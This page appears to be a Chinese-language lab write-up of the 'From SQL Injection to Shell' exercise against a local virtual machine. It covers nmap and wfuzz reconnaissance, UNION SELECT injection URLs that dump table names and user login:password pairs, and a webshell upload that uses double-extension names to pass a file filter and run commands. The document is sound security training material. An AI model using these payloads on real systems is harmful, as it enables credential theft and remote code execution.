@@ -1,0 +1,637 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>从sql注入到shell | 开发者问答集锦</title>
+    <meta property="og:title" content="从sql注入到shell - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="从sql注入到shell">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0shell/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">从sql注入到shell</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            <blockquote>
+<p>实验：From SQL Injection to Shell</p>
+</blockquote>
+
+<ul>
+<li><p>实验环境搭建</p>
+
+<ul>
+<li>victim： from_sqli_to_shell_i386.iso(debian 32)</li>
+<li>attacker： kali</li>
+</ul></li>
+</ul>
+
+<p>网络拓扑图如下：</p>
+
+<p><a href="https://img.it610.com/image/info8/c1d7698fc978405587679544d9a49133.jpg"><img src="https://img.it610.com/image/info8/c1d7698fc978405587679544d9a49133.jpg" alt="从sql注入到shell_第1张图片" /></a></p>
+
+<p>安装工具 wfuzz步骤如下：</p>
+
+<pre><code>* 下载wfuzz
+* 解压到共享文件夹，使用时进入解压目录，即可使用wfuzz。
+</code></pre>
+
+<ul>
+<li>攻击分为三步进行：</li>
+</ul>
+
+<p>1.Fingerprinting</p>
+
+<p>2.Detection and exploitation of SQL injection</p>
+
+<p>3.Access to the administration pages and code execution</p>
+
+<p>以下是每一步的具体介绍：</p>
+
+<hr />
+
+<blockquote>
+<p>1.Fingerprinting</p>
+</blockquote>
+
+<p>一、在进行实验之前，首先使用nmap 扫描一下 victim 对外开放的端口<br />
+<code>nmap 10.0.2.12</code></p>
+
+<p>扫描结果如下：</p>
+
+<pre><code>Nmap scan report for bogon (10.0.2.12)
+Host is up (0.000095s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:7D:5D:57 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
+</code></pre>
+
+<p>由上面的扫描结果可知， victim的 22/tcp 和 80/tcp 端口均是开放的。</p>
+
+<p>二、 FingerPrinting ，顾名思义，可以用来收集<code>web application</code> 的信息。分为以下两步进行:</p>
+
+<ol>
+<li><p><strong>inspecting HTTP headers</strong><br />
+netcat/telnet 可以用于连接web app ，从而获取server的信息。<br />
+以telnet 为例， 在 attacker 的终端输入：</p>
+
+<pre><code>`telnet 10.0.2.10 80`
+</code></pre>
+
+<p><code>GET / HTTP/1.1</code>
+<code>Host: 10.0.2.12</code></p></li>
+</ol>
+
+<p>victim 返回的文件信息如下：</p>
+
+<pre><code>     HTTP/1.1 200 OK
+ Date: Sat, 17 Nov 2018 06:49:58 GMT
+ Server: Apache/2.2.16 (Debian)
+ X-Powered-By: PHP/5.3.3-7+squeeze14
+ Vary: Accept-Encoding
+ Content-Length: 1343
+ Content-Type: text/html
+</code></pre>
+
+<p>由上面的返回信息可以看到，我们可以获取server端 apache、php的<code>版本信息</code>。</p>
+
+<p>由上面的扫描结果可知，<code>443/tcp</code>端口并未开放，所以我们只能通过
+HTTP的方式访问victim，如果victim只能通过HTTPS的方式进行访问，telent/natcat 就不能用于与 victim
+通信，此时我们可以使用工具 <code>openssl</code> 访问victim(nc -nvlp 443 可以开启 443/https 服务)。</p>
+
+<ol>
+<li><strong>using a directory Buster</strong></li>
+</ol>
+
+<p>使用工具 wfuzz用于检测victim的目录和文件结构。<br />
+wfuzz的基于一个简单的概念：它用一个给定的payload来替换相应的FUZZ关键词的值，我们称FUZZ这样的关键词为 <code>占位符</code> ,
+而payload则是一个<code>输入的源</code>。</p>
+
+<p>在 attacker 中使用 <code>wfuzz -w wordlist/general/big.txt --hc 404
+http://10.0.2.12/FUZZ</code> 扫描victim，扫描结果如下：</p>
+
+<pre><code>Warning: Pycurl is not compiled against Openssl. Wfuzz might not                  work correctly when fuzzing SSL sites. Check Wfuzz's documentation    for more information.
+
+********************************************************
+* Wfuzz 2.3 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://10.0.2.12/FUZZ
+Total requests: 3036
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000138:  C=301      9 L       28 W      306 Ch    &quot;admin&quot;
+000547:  C=200     92 L      141 W     1858 Ch    &quot;cat&quot;
+000586:  C=403     10 L       30 W      285 Ch    &quot;cgi-bin/&quot;
+000642:  C=301      9 L       28 W      308 Ch    &quot;classes&quot;
+000761:  C=301      9 L       28 W      304 Ch    &quot;css&quot;
+001290:  C=200     40 L       63 W      796 Ch    &quot;header&quot;
+001362:  C=301      9 L       28 W      307 Ch    &quot;images&quot;
+001375:  C=200     71 L      103 W     1343 Ch    &quot;index&quot;
+002489:  C=200     70 L      108 W     1320 Ch    &quot;show&quot;
+
+Total time: 4.734385
+Processed Requests: 3036
+Filtered Requests: 3027
+Requests/sec.: 641.2659
+</code></pre>
+
+<p>在 attacker 中使用 <code>wfuzz -w wordlist/general/common.txt --hc 404
+http://10.0.2.12/FUZZ.php</code> 扫描victim，扫描结果如下：</p>
+
+<pre><code>Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://10.0.2.12/FUZZ.php
+Total requests: 950
+
+==================================================================
+ID  Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000076:  C=200     96 L      148 W     2022 Ch    &quot;all&quot;
+000167:  C=200     92 L      141 W     1858 Ch    &quot;cat&quot;
+000406:  C=200     40 L       63 W      796 Ch    &quot;header&quot;
+000438:  C=200     71 L      103 W     1343 Ch    &quot;index&quot;
+000761:  C=200     70 L      108 W     1320 Ch    &quot;show&quot;
+
+Total time: 1.379570
+Processed Requests: 950
+Filtered Requests: 945
+Requests/sec.: 688.6203
+</code></pre>
+
+<hr />
+
+<blockquote>
+<p>2.Detection and exploitation of SQL injection**</p>
+</blockquote>
+
+<p>检测和利用SQL进行注入，大体分为如下两步：</p>
+
+<ol>
+<li><strong>Detection of SQL injection</strong></li>
+</ol>
+
+<p>a. 基于<code>Intergers</code>的检测</p>
+
+<pre><code>    在attacker中访问如下网址 `10.0.2.12/cat.php?id =1`，显示如下：
+ ![1](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/1.PNG)
+
+ 在attacker中访问如下网址 `10.0.2.12/cat.php?id =2`，显示如下：
+ ![2](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/2.PNG)  
+
+ 在attacker中访问如下网址 `10.0.2.12/cat.php?id =2-1`，显示如下：
+ ![3](https://github.com/CUCCS/2018-NS-Public-jackcily/raw/Ns_chap0x07_%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/img/3.PNG)
+
+在attacker中访问如下网址 `10.0.2.12/cat.php?id =2  and 1=1`，推测server端执行 `select id = 2 and 1=1 from .....` ,显示如下：
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/9a7bbd0113f64a55b53fd86e256ead2e.jpg"><img src="https://img.it610.com/image/info8/9a7bbd0113f64a55b53fd86e256ead2e.jpg" alt="从sql注入到shell_第2张图片" /></a></p>
+
+<p>由上面的访问结果可知，当 <code>id = 2-1</code> 时,访问结果的页面等同于 <code>id = 1</code>,可见减法被数据库自动执行。这样就找到了一个SQL注入。<br />
+由上面实验表现可知，victim端数据库查询id时，使用interger而非string。SQL允许两种语法，但是使用interger查询比使用string更快。</p>
+
+<p>b.基于string的检测</p>
+
+<p>在SQL中使用 ’ – 可以注释SQL 查询的剩余部分。</p>
+
+<hr />
+
+<ol>
+<li><strong>Exploitation of SQL injections</strong></li>
+</ol>
+
+<p>a. <code>union</code>关键字<br />
+SQL UNION 语句用于合并两个或多个SELECT语句的结果。<br />
+UNION 内部的每个select语句必须拥有相同数量的列。列也必须拥有相似的数据类型，同时，每个select语句中的列的顺序必须相同。UNION
+会对结果的每一列进行自动去重。</p>
+
+<p>最关键的地方在于，使用 <code>union</code> 连接的两条语句必须返回相同的列数，否则数据库会报错。</p>
+
+<p>b. 使用 <code>UNION</code> 完成SQL注入</p>
+
+<p>基本步骤如下：</p>
+
+<pre><code>      1.首先找到UNION语句内部的列数。
+  2.判断每列在页面中回显的列
+  3.从meta-table中检索信息
+  4.从其他表或数据库中检索信息
+</code></pre>
+
+<p>为了找到列数，有两种方法</p>
+
+<pre><code>      1.使用 UNION SELECT 并增加列数
+  2.使用ORDER　BY语句
+</code></pre>
+
+<hr />
+
+<ol>
+<li>如果使用 UNION SELECT语句，可以利用如下报错信息进行枚举：<br />
+<code>The used SELECT statements have a different number of columns</code> <code>The used
+SELECT statements have a different number of columns</code></li>
+</ol>
+
+<p>使用victim进行测试，在网址中不断加入值 1,2，3… 进行枚举，当加入到第4列的时候，网页正常显示。如下图：<br />
+<a href="https://img.it610.com/image/info8/c1de4ab44a4444c4903a3975d7990148.jpg"><img src="https://img.it610.com/image/info8/c1de4ab44a4444c4903a3975d7990148.jpg" alt="从sql注入到shell_第3张图片" /></a></p>
+
+<p>而加入到第5列的时候出错，可推测出数据库中select语句一共有4列。</p>
+
+<hr />
+
+<p><strong>注意</strong> ：</p>
+
+<p>使用数值 1,2,3… 适用于mysql，但并一定适用于其他数据库。此时，如果要求UNION两边列的类型相同，数值 1,2,3… 应被替换成 null,
+null,null … 。在Oracle中，使用select语句必须使用 from，此时可用 <code>dual</code> 可用于填充表格，即<code>UNION SELECT
+null,null... FROM dual</code>。</p>
+
+<hr />
+
+<ol>
+<li>类似的，也可以使用 ORDER BY 语句进行枚举，使用 <code>SELECT firstname,lastname,age,groups FROM users ORDER BY column value</code> 时，数据库会按照对应的列进行排序输出结果，但是如果使用了不存在列，数据库会进行如下的报错： <code>Unknown column 'xxx' in 'order clause'</code>, 可以借用此报错信息推断出select语句对应的列数。</li>
+</ol>
+
+<p>使用victim进行测试，在ORDER BY 语句后依次进行测试，当测试到5时，出现报错信息，如下：<br />
+<a href="https://img.it610.com/image/info8/2df9c7df34434fd29ff660c8d3dc325f.jpg"><img src="https://img.it610.com/image/info8/2df9c7df34434fd29ff660c8d3dc325f.jpg" alt="从sql注入到shell_第4张图片" /></a></p>
+
+<p>由以上两种信息，都可猜测出victim的该select语句的列数为4.</p>
+
+<p>c. 检索信息</p>
+
+<p>基于以上的报错信息，可知victim的后端数据库使用的是MYSQL。已知select语句的列数为4，我们可以在UNION部分对数值进行替换，强制数据执行某些函数。<br />
+如可以使用如下 URL获取信息：</p>
+
+<p>1.数据库版本 <code>http://vulnerable/cat.php?id=1 UNION SELECT 1, @@version,3,4</code><br />
+<a href="https://img.it610.com/image/info8/0b20f6f61fda48b195f2cad67dec2201.jpg"><img src="https://img.it610.com/image/info8/0b20f6f61fda48b195f2cad67dec2201.jpg" alt="从sql注入到shell_第5张图片" /></a></p>
+
+<p>2.当前用户 <code>http://vulnerable/cat.php?id=1 UNION SELECT 1, current_user(),3,4</code><br />
+<a href="https://img.it610.com/image/info8/79959fe7ff9b467e967a08417401a2f1.jpg"><img src="https://img.it610.com/image/info8/79959fe7ff9b467e967a08417401a2f1.jpg" alt="从sql注入到shell_第6张图片" /></a></p>
+
+<p>3.当前使用的数据库 <code>http://vulnerable/cat.php?id=1 UNION SELECT 1, database(),3,4</code><br />
+<a href="https://img.it610.com/image/info8/b79fdd91770745ab806d4d54100bf753.jpg"><img src="https://img.it610.com/image/info8/b79fdd91770745ab806d4d54100bf753.jpg" alt="从sql注入到shell_第7张图片" /></a></p>
+
+<p>现在我们可以检索任意我们想检索的信息，为了检索相关信息，我们需要：</p>
+
+<pre><code>     当前数据库中的所有表项
+     我们想获取信息的表对应的列名
+</code></pre>
+
+<p>MYSQL 从<code>版本5</code>开始提供关于数据库表和列的的元信息（meta-information)，这些表存储在数据库 <code>information_shema</code>
+中，并且，在<code>information_schema.columns</code>中存储了每列对应的表格信息。可以使用以下的查询获取对应信息：</p>
+
+<pre><code>  1.所有表格的列表       `SELECT table_name FROM information_schema.tables`
+  2.所有列的列表         `SELECT column_name FROM information_schema.columns`
+  3. 所有列对应归属的表   `SELECT table_name,column_name FROM information_schema.columns`
+</code></pre>
+
+<p>根据上面的查询，可以结合之前的URL利用UNION进行注入,使用victim测试以下语句：</p>
+
+<p>1.获取所有表格的列表 <code>http://vulnerable/cat.php?id=1 UNION SELECT 1,table_name ,3,4
+FROM information_schema.tables</code><br />
+<a href="https://img.it610.com/image/info8/584827ff38df4e02a7e0460a1efef1aa.jpg"><img src="https://img.it610.com/image/info8/584827ff38df4e02a7e0460a1efef1aa.jpg" alt="从sql注入到shell_第8张图片" /></a></p>
+
+<p>2.获取所有列的列表 <code>http://vulnerable/cat.php?id=1 UNION SELECT 1,column_name ,3,4
+FROM information_schema.columns</code><br />
+<a href="https://img.it610.com/image/info8/313428f8bf7542edba0d2ac0aa2881ca.jpg"><img src="https://img.it610.com/image/info8/313428f8bf7542edba0d2ac0aa2881ca.jpg" alt="从sql注入到shell_第9张图片" /></a></p>
+
+<p>3.按顺序获取所有列对应属于的表 <code>http://vulnerable/cat.php?id=1 UNION SELECT 1,table_name
+,column_name,4 FROM information_schema.columns</code><br />
+<a href="https://img.it610.com/image/info8/8c778a49cdbf45e288badb9683812e5e.jpg"><img src="https://img.it610.com/image/info8/8c778a49cdbf45e288badb9683812e5e.jpg" alt="从sql注入到shell_第10张图片" /></a></p>
+
+<p>4.同时输出列和列对应的表名称： <code>http://vulnerable/cat.php?id=1 UNION SELECT
+1,concat(table_name ,':',column_name),3,4 FROM information_schema.columns</code><br />
+<a href="https://img.it610.com/image/info8/b4d7ef0e4fb84abd94b65ddb19bd1f90.jpg"><img src="https://img.it610.com/image/info8/b4d7ef0e4fb84abd94b65ddb19bd1f90.jpg" alt="从sql注入到shell_第11张图片" /></a></p>
+
+<hr />
+
+<p><strong>注意</strong> ：<br />
+如果想使用正则匹配对结果进行提取，可以在输出信息中加入标记。</p>
+
+<hr />
+
+<p>现在我们获取了所有的表格及其包含的列，第一个表格是默认的MYSQL表格，在HTML的结尾的表格可能就是当前正在使用的表。</p>
+
+<p>现在，我们可以随意查询我们想获取的信息。<br />
+例如，我们可以在使用如下语句，查询用户登录密码：<br />
+<code>http://vulnerable/cat.php?id=1 UNION SELECT 1,concat(login,':',password),3,4
+FROM users</code><br />
+使用victim 进行测试，测试结果如下：<br />
+<a href="https://img.it610.com/image/info8/efce72bf5311422986282d2dd4b3b253.jpg"><img src="https://img.it610.com/image/info8/efce72bf5311422986282d2dd4b3b253.jpg" alt="从sql注入到shell_第12张图片" /></a></p>
+
+<blockquote>
+<p>3.Access to the administration pages and code execution**</p>
+</blockquote>
+
+<p>访问administer和运行代码大致分为2步：</p>
+
+<ol>
+<li><p><strong>Cracking the password</strong><br />
+使用以下两种方法可以轻易破解密码：</p>
+
+<pre><code>1.搜索引擎
+</code></pre>
+
+<p>2.John-The-Ripper <a href="http://www.openwall.com/john/">http://www.openwall.com/john/</a></p></li>
+</ol>
+
+<p>如果密码的哈西值没有进行加盐，可以使用搜索引擎直接搜索。也可以使用john工具进行解密。<br />
+使用搜索引擎直接搜索获取到密码如下：<code>P4sswrd</code></p>
+
+<ol>
+<li><strong>Uploading a Webshell and Code Execution</strong><br />
+已经获取了用户名和密码，现在的任务就是找到方法在victim的操作系统中运行指令。 可以使用以下<code>webshell</code>代码 在 victim中获取参数
+<code>cmd</code>并执行。
+
+<br />
+<br />
+<br />
+<br /></li>
+</ol>
+
+<p>假设将文件命名为 <code>shell.php</code> ,那么怎么上传这段代码呢？<br />
+使用已经获取的用户名密码登录网站，则可以看到网站支持上传新的图片，可以使用该功能将代码上传。<br />
+<a href="https://img.it610.com/image/info8/fc5fe9062bef4b69862464017a7d88c4.jpg"><img src="https://img.it610.com/image/info8/fc5fe9062bef4b69862464017a7d88c4.jpg" alt="从sql注入到shell_第13张图片" /></a></p>
+
+<p>为了防止网站对 .php 结尾的文件的过滤，有两种方法：</p>
+
+<pre><code>   1.命名为 `shell.php3`
+   2.命名为 `shell.php.test`  ，可以躲过对 .php 文件的过滤，同时由于 Apache并没有  `.test` 的文件，所以会运行   `.php` 的文件。
+</code></pre>
+
+<p>现在我们将重命名后的文件 <code>shell.php.test</code> 通过图片上传的方式传到服务器上，上传成功截图如下：<br />
+<a href="https://img.it610.com/image/info8/91dc93ad66044ec2a754aeb920a56ef3.jpg"><img src="https://img.it610.com/image/info8/91dc93ad66044ec2a754aeb920a56ef3.jpg" alt="从sql注入到shell_第14张图片" /></a></p>
+
+<p>然后在浏览器中，访问 <code>http://10.0.2.12/admin/uploads/shell.php3?cmd=uname</code> ，这样在受害者端会执行指令
+<code>uname</code> ,返回结果如下：</p>
+
+<p><a href="https://img.it610.com/image/info8/c15ae2f3874748e380c5866261fc8cd6.png"><img src="https://img.it610.com/image/info8/c15ae2f3874748e380c5866261fc8cd6.png" alt="从sql注入到shell_第15张图片" /></a></p>
+
+<p>还有许多指令也可以执行，事实上，webshell和 web
+server上运行的php脚本具有相同的权限。在victim的server端每一个命令的运行都是相互独立的。</p>
+
+<p><strong>参考资料</strong> ：<br />
+拓展：burp suite</p>
+
+<ol>
+<li><p>wfuzz manual</p></li>
+
+<li><p>blog of this experiment</p></li>
+</ol>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
